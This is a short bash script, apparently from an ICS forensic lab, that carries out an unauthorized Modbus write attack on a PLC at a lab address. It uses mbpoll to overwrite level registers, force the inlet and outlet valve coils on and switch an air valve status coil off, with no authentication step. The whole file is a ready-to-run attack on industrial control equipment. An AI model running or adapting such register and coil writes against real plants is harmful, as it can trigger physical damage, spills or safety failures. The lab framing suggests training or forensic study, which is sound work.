#!/usr/bin/env bash
set -e

# ============================================================
# MODBUS UNAUTHORIZED WRITE ATTACK – FORENSIC LAB
# Target PLC: 10.0.2.22
# Tool      : mbpoll
# ============================================================

PLC_IP="10.0.2.22"
UNIT_ID=1
SLEEP_TIME=2

echo "[ATTACK] Modbus unauthorized write attack started"
echo "[TARGET] PLC $PLC_IP"
echo

# ------------------------------------------------------------
# LEVEL_MAX → Holding Register 400004 (%QW3)
# FC6 – Write Single Register
# ------------------------------------------------------------
echo "[ATTACK] Writing level_max (400004) = 10"
mbpoll -m tcp -a $UNIT_ID -r 4 -t 3 -c 1 -w 10 "$PLC_IP"
sleep $SLEEP_TIME

# ------------------------------------------------------------
# LEVEL → Holding Register 400003 (%QW2)
# FC6 – Write Single Register
# ------------------------------------------------------------
echo "[ATTACK] Writing level (400003) = 5"
mbpoll -m tcp -a $UNIT_ID -r 3 -t 3 -c 1 -w 5 "$PLC_IP"
sleep $SLEEP_TIME

# ------------------------------------------------------------
# openInletValve → Coil 5 (%QX0.4)
# FC5 – Write Single Coil
# ------------------------------------------------------------
echo "[ATTACK] Forcing openInletValve (coil 5) = ON"
mbpoll -m tcp -a $UNIT_ID -r 5 -t 0 -c 1 -w 1 "$PLC_IP"
sleep $SLEEP_TIME

# ------------------------------------------------------------
# openOutletValve → Coil 2 (%QX0.1)
# FC5 – Write Single Coil
# ------------------------------------------------------------
echo "[ATTACK] Forcing openOutletValve (coil 2) = ON"
mbpoll -m tcp -a $UNIT_ID -r 2 -t 0 -c 1 -w 1 "$PLC_IP"
sleep $SLEEP_TIME

# ------------------------------------------------------------
# airValveOpenStatus → Coil 7 (%QX0.6)
# FC5 – Write Single Coil
# ------------------------------------------------------------
echo "[ATTACK] Disabling airValveOpenStatus (coil 7) = OFF"
mbpoll -m tcp -a $UNIT_ID -r 7 -t 0 -c 1 -w 0 "$PLC_IP"
sleep $SLEEP_TIME

echo
echo "[ATTACK] Modbus unauthorized write attack completed"
